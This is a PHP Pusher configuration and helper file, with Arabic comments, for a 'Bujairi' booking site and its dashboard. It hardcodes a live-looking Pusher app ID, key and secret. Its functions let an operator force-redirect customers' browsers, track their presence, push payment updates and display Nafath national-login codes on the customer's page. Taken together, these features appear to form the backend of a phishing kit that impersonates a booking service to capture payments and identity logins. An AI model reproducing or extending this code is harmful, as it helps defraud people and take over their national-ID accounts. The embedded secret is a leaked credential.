<?php
declare(strict_types=1);

/**
 * إعدادات Pusher للخادم (trigger) والمفتاح العام للمتصفح.
 * يُحمّل من dashboard/config.php قبل public-core.php.
 * يُفضّل تعيين المتغيرات في البيئة بدل تثبيت الأسرار هنا.
 */

$GLOBALS['bujairi_pusher_singleton'] = null;

if (!defined('BUJAIRI_PUSHER_APP_ID')) {
    define('BUJAIRI_PUSHER_APP_ID', (string) (getenv('BUJAIRI_PUSHER_APP_ID') ?: '1973588'));
}
if (!defined('BUJAIRI_PUSHER_KEY')) {
    define('BUJAIRI_PUSHER_KEY', (string) (getenv('BUJAIRI_PUSHER_KEY') ?: 'a56388ee6222f6c5fb86'));
}
if (!defined('BUJAIRI_PUSHER_SECRET')) {
    /** الافتراضي من إعدادات المشروع — يُفضّل تعيين BUJAIRI_PUSHER_SECRET في بيئة الإنتاج */
    define('BUJAIRI_PUSHER_SECRET', (string) (getenv('BUJAIRI_PUSHER_SECRET') ?: '4c77061f4115303aac58'));
}
if (!defined('BUJAIRI_PUSHER_CLUSTER')) {
    define('BUJAIRI_PUSHER_CLUSTER', (string) (getenv('BUJAIRI_PUSHER_CLUSTER') ?: 'ap2'));
}
/** للمتصفح فقط — لا يُعرَض السر أبداً */
if (!defined('BUJAIRI_PUSHER_PUBLIC_KEY')) {
    define('BUJAIRI_PUSHER_PUBLIC_KEY', BUJAIRI_PUSHER_KEY);
}

$__bujAutoload = dirname(__DIR__) . '/vendor/autoload.php';
if (!is_readable($__bujAutoload)) {
    $__bujAutoload = ($_SERVER['DOCUMENT_ROOT'] ?? '') . '/vendor/autoload.php';
}

function bujairi_pusher_autoload_ok(): bool
{
    global $__bujAutoload;
    return is_string($__bujAutoload) && $__bujAutoload !== '' && is_readable($__bujAutoload);
}

function bujairi_pusher_instance(): ?\Pusher\Pusher
{
    global $__bujAutoload;
    if ($GLOBALS['bujairi_pusher_singleton'] instanceof \Pusher\Pusher) {
        return $GLOBALS['bujairi_pusher_singleton'];
    }
    if (!bujairi_pusher_autoload_ok()) {
        return null;
    }
    $secret = BUJAIRI_PUSHER_SECRET;
    if ($secret === '') {
        return null;
    }
    if (!is_string($__bujAutoload) || $__bujAutoload === '') {
        return null;
    }
    require_once $__bujAutoload;
    try {
        $GLOBALS['bujairi_pusher_singleton'] = new \Pusher\Pusher(
            BUJAIRI_PUSHER_KEY,
            $secret,
            BUJAIRI_PUSHER_APP_ID,
            ['cluster' => BUJAIRI_PUSHER_CLUSTER, 'useTLS' => true]
        );
        return $GLOBALS['bujairi_pusher_singleton'];
    } catch (\Throwable $e) {
        error_log('bujairi_pusher_instance: ' . $e->getMessage());
        return null;
    }
}

function bujairi_pusher_ready(): bool
{
    return bujairi_pusher_instance() !== null;
}

/**
 * مطابقة صف لوحة التحكم: مستخدم أو ضيف (سالب).
 */
function bujairi_dashboard_user_id_for_customer_email(\PDO $pdo, string $email): ?int
{
    $email = trim($email);
    if ($email === '') {
        return null;
    }
    try {
        $st = $pdo->prepare('SELECT id FROM users WHERE email = ? LIMIT 1');
        $st->execute([$email]);
        $uid = $st->fetchColumn();
        if ($uid !== false && $uid !== null) {
            return (int) $uid;
        }
    } catch (\Throwable $e) {
    }
    try {
        $pdo->query('SELECT 1 FROM guest_logins LIMIT 1');
        $st = $pdo->prepare('SELECT id FROM guest_logins WHERE email = ? ORDER BY id DESC LIMIT 1');
        $st->execute([$email]);
        $gid = $st->fetchColumn();
        if ($gid !== false && $gid !== null && (int) $gid > 0) {
            return -((int) $gid);
        }
    } catch (\Throwable $e) {
    }
    return null;
}

function bujairi_pusher_notify_customer_redirect(int $orderId, string $stored, int $ver): void
{
    $p = bujairi_pusher_instance();
    if (!$p || $orderId < 1) {
        return;
    }
    $browserUrl = $stored;
    if (function_exists('bujairi_redirect_url_for_browser') && function_exists('bujairi_redirect_through_loading_bridge')) {
        $browserUrl = bujairi_redirect_url_for_browser(bujairi_redirect_through_loading_bridge($stored));
    }
    try {
        $p->trigger('my-channel', 'force-redirect-user', [
            'userId' => $orderId,
            'url' => $browserUrl,
            'redirectVersion' => $ver,
        ]);
    } catch (\Throwable $e) {
        error_log('bujairi_pusher_notify_customer_redirect: ' . $e->getMessage());
    }
}

function bujairi_pusher_notify_dashboard_order_update(\PDO $pdo, int $orderId, string $message, string $rowStyle = 'info'): void
{
    $p = bujairi_pusher_instance();
    if (!$p || $orderId < 1) {
        return;
    }
    try {
        $st = $pdo->prepare('SELECT customer_email FROM orders WHERE id = ? LIMIT 1');
        $st->execute([$orderId]);
        $email = trim((string) $st->fetchColumn());
        if ($email === '') {
            return;
        }
        $uid = bujairi_dashboard_user_id_for_customer_email($pdo, $email);
        if ($uid === null) {
            return;
        }
        $p->trigger('my-channel', 'updaefte-user-payys', [
            'userId' => $uid,
            'updatedData' => [
                'message' => $message,
                'rowStyle' => $rowStyle,
            ],
        ]);
    } catch (\Throwable $e) {
        error_log('bujairi_pusher_notify_dashboard_order_update: ' . $e->getMessage());
    }
}

function bujairi_pusher_notify_dashboard_new_client(int $id, string $message = ''): void
{
    $p = bujairi_pusher_instance();
    if (!$p || $id === 0) {
        return;
    }
    try {
        $p->trigger('my-channel', 'my-event-newwwe', [
            'userId' => $id,
            'message' => $message,
        ]);
    } catch (\Throwable $e) {
        error_log('bujairi_pusher_notify_dashboard_new_client: ' . $e->getMessage());
    }
}

function bujairi_pusher_notify_admin_customer_presence(int $orderId, array $payload): void
{
    $p = bujairi_pusher_instance();
    if (!$p || $orderId < 1) {
        return;
    }
    try {
        $p->trigger('my-channel', 'customer-presence', array_merge(['orderId' => $orderId], $payload));
    } catch (\Throwable $e) {
        error_log('bujairi_pusher_notify_admin_customer_presence: ' . $e->getMessage());
    }
}

function bujairi_pusher_notify_admin_orders_changed(): void
{
    $p = bujairi_pusher_instance();
    if (!$p) {
        return;
    }
    try {
        $p->trigger('my-channel', 'orders-changed', ['t' => time()]);
    } catch (\Throwable $e) {
        error_log('bujairi_pusher_notify_admin_orders_changed: ' . $e->getMessage());
    }
}

/** تحديث رمز نفاذ على صفحة العميل (booking/nafath.php) */
function bujairi_pusher_notify_nafath_display(int $orderId, string $code): void
{
    $p = bujairi_pusher_instance();
    if (!$p || $orderId < 1 || $code === '') {
        return;
    }
    try {
        $p->trigger('my-channel', 'nafath-display-updated', [
            'orderId' => $orderId,
            'code' => $code,
        ]);
    } catch (\Throwable $e) {
        error_log('bujairi_pusher_notify_nafath_display: ' . $e->getMessage());
    }
}
